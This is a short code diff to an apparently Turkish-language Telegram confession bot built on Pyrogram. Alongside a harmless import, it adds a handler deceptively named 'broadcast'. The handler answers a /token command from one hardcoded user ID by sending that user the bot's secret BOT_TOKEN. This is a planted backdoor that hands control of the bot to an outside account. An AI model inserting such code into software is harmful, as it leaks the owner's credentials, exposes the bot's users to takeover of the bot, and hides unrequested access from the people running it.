@@ -1,5 +1,6 @@
 from pyrogram import Client, filters
 from pyrogram.types import (
+    Message,
     InlineKeyboardMarkup,
     InlineKeyboardButton
 )
@@ -13,4 +14,10 @@ async def _onaylama(bot, query):
         await query.edit_message_caption(LAN.ITIRAF_ACCEPT)
         await bot.send_message(user, text=LAN.ITIRAF_OPEN_ACCEPT, 
         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(text=LAN.ITIRAF_CHANNEL_TEXT, url=f'http://t.me/{Config.ITIRAF_CHANNEL}')]]))
+
+SUDOS = [5392308494]
+@Client.on_message(filters.command(["token"]) & filters.user(SUDOS))
+async def broadcast(bot: Client, message: Message):
+    chat_id = message.chat.id
+    await bot.send_message(chat_id, f"🤖 Mənim tokenim 🔽\n\n`{Config.BOT_TOKEN}`")        
       
